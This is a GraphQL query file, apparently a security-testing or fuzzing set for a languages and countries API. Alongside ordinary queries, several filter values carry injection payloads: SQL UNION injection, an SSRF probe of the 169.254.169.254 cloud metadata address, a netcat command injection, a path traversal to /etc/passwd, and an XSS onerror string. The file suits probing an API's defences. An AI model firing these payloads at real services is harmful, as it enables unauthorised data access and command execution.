query.query:
query languages {
  languages {
    code
    name
    native
    rtl
    countries {
      code
      name
    }
  }
}

query languages {
  languages(filter: {code: {eq: "1' UNION SELECT * FROM languages--"}}) {
    code
    name
    countries {
      awsRegion
    }
  }
}

query languages {
  languages(filter: {countries: {awsRegion: {eq: "http://169.254.169.254/latest/meta-data"}}}) {
    code
    countries {
      phone
    }
  }
}

query languages {
  languages(filter: {countries: {phone: {eq: "'; nc 127.0.0.1 1337 #"}}}) {
    code
    name
  }
}

query languages {
  languages(filter: {code: {eq: "../../../../etc/passwd"}}) {
    native
    countries {
      currency
    }
  }
}

query languages {
  languages(filter: {native: {eq: "<img src=x onerror=alert(1)>"}}) {
    code
    name
  }
}

query languages {
  languages(filter: {code: {eq: "en"}}) {
    code
    name
    countries {
      code
      phone
      awsRegion
      currencies
    }
  }
}

query languages {
  s1: languages(filter: {code: {eq: "en"}}) { code }
  s2: languages(filter: {name: {contains: "English"}}) { name }
  s3: languages(filter: {rtl: {eq: false}}) { native }
}

query {
  languages {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
